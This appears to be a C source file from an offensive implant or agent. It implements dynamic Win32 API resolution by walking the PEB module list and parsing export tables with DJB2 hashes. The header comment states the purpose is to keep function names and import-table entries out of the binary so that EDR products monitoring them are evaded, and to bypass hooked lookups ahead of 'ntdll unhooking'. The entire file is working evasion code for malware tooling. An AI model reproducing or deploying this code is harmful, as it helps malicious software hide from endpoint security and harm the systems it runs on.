/*
 * api_resolve.c — Dynamic API resolution via PEB walking + export table parsing.
 *
 * Resolves Win32 API functions at runtime using DJB2 hashes, avoiding
 * plaintext function names in the binary and IAT entries that EDRs monitor.
 *
 * Resolution flow:
 *   1. Walk PEB→Ldr→InMemoryOrderModuleList to find loaded DLLs
 *   2. Hash each module's BaseDllName (case-insensitive) with DJB2
 *   3. When module hash matches, walk its export table
 *   4. Hash each exported function name with DJB2
 *   5. When function hash matches, return the function address
 *
 * This avoids calling GetModuleHandle/GetProcAddress (which can be hooked)
 * for the initial bootstrap. After ntdll unhooking, direct calls are safer.
 */
#include "agent.h"
#include "api_resolve.h"

/* ─── DJB2 hash (case-insensitive for module names) ─── */

DWORD api_hash(const char *str) {
    if (!str) return 0;
    DWORD hash = 5381;
    int c;
    while ((c = (unsigned char)*str++) != 0) {
        hash = ((hash << 5) + hash) + c;  /* hash * 33 + c */
    }
    return hash;
}

static DWORD _hash_unicode_ci(const wchar_t *str, USHORT lenBytes) {
    if (!str || lenBytes == 0) return 0;
    DWORD hash = 5381;
    USHORT lenChars = lenBytes / sizeof(wchar_t);
    for (USHORT i = 0; i < lenChars; i++) {
        wchar_t c = str[i];
        /* Case-insensitive: uppercase → lowercase */
        if (c >= L'A' && c <= L'Z')
            c += 32;
        hash = ((hash << 5) + hash) + (DWORD)c;
    }
    return hash;
}

/* ─── PEB structures (avoid including winternl.h for portability) ─── */

typedef struct _PEB_LDR_DATA_MANUAL {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA_MANUAL;

typedef struct _LDR_DATA_TABLE_ENTRY_MANUAL {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    /* ... more fields we don't need */
} LDR_DATA_TABLE_ENTRY_MANUAL;

/*
 * Get PEB pointer via GS segment register (x64) or FS (x86).
 */
static void *_get_peb(void) {
#if defined(__x86_64__) || defined(_M_X64)
    void *peb;
    __asm__ __volatile__("mov %%gs:0x60, %0" : "=r"(peb));
    return peb;
#elif defined(__i386__) || defined(_M_IX86)
    void *peb;
    __asm__ __volatile__("mov %%fs:0x30, %0" : "=r"(peb));
    return peb;
#else
    return NULL;
#endif
}

/*
 * Walk PE export table to find a function by hash.
 */
void *api_resolve_from_module(HMODULE hMod, DWORD functionHash) {
    if (!hMod) return NULL;

    unsigned char *base = (unsigned char *)hMod;

    /* Validate DOS header */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    /* Validate NT headers */
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    /* Get export directory */
    DWORD exportRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD exportSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (exportRVA == 0 || exportSize == 0) return NULL;

    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(base + exportRVA);

    DWORD *nameRVAs    = (DWORD *)(base + exports->AddressOfNames);
    WORD  *ordinals    = (WORD  *)(base + exports->AddressOfNameOrdinals);
    DWORD *funcRVAs    = (DWORD *)(base + exports->AddressOfFunctions);
    DWORD numNames     = exports->NumberOfNames;

    for (DWORD i = 0; i < numNames; i++) {
        const char *funcName = (const char *)(base + nameRVAs[i]);
        DWORD hash = api_hash(funcName);

        if (hash == functionHash) {
            DWORD funcRVA = funcRVAs[ordinals[i]];

            /* Check for forwarded export (RVA points within export directory) */
            if (funcRVA >= exportRVA && funcRVA < exportRVA + exportSize) {
                /*
                 * Forwarded export: string is "DLL.Function"
                 * We could recursively resolve, but for simplicity we skip.
                 * Most critical functions (Nt*, Rtl*) are not forwarded.
                 */
                return NULL;
            }

            return (void *)(base + funcRVA);
        }
    }

    return NULL;
}

/*
 * Walk PEB module list to find a module by hash, then resolve function.
 */
void *api_resolve(DWORD moduleHash, DWORD functionHash) {
    void *peb = _get_peb();
    if (!peb) return NULL;

    /*
     * PEB layout (x64):
     *   +0x018: Ldr (PEB_LDR_DATA*)
     */
#if defined(__x86_64__) || defined(_M_X64)
    PEB_LDR_DATA_MANUAL *ldr = *(PEB_LDR_DATA_MANUAL **)((unsigned char *)peb + 0x18);
#else
    PEB_LDR_DATA_MANUAL *ldr = *(PEB_LDR_DATA_MANUAL **)((unsigned char *)peb + 0x0C);
#endif

    if (!ldr) return NULL;

    /* Walk InMemoryOrderModuleList */
    LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY *entry = head->Flink;

    while (entry != head) {
        /*
         * InMemoryOrderLinks is the second LIST_ENTRY in LDR_DATA_TABLE_ENTRY.
         * Subtract offset to get the table entry base.
         * On x64: offsetof(InMemoryOrderLinks) = 0x10
         * On x86: offsetof(InMemoryOrderLinks) = 0x08
         */
        LDR_DATA_TABLE_ENTRY_MANUAL *tableEntry =
            (LDR_DATA_TABLE_ENTRY_MANUAL *)((unsigned char *)entry -
#if defined(__x86_64__) || defined(_M_X64)
                sizeof(LIST_ENTRY) /* InLoadOrderLinks */
#else
                sizeof(LIST_ENTRY)
#endif
            );

        if (tableEntry->DllBase && tableEntry->BaseDllName.Buffer &&
            tableEntry->BaseDllName.Length > 0)
        {
            DWORD modHash = _hash_unicode_ci(
                tableEntry->BaseDllName.Buffer,
                tableEntry->BaseDllName.Length
            );

            if (modHash == moduleHash) {
                return api_resolve_from_module(
                    (HMODULE)tableEntry->DllBase,
                    functionHash
                );
            }
        }

        entry = entry->Flink;

        /* Safety: don't loop forever on corrupted list */
        if (entry == head) break;
    }

    return NULL;
}
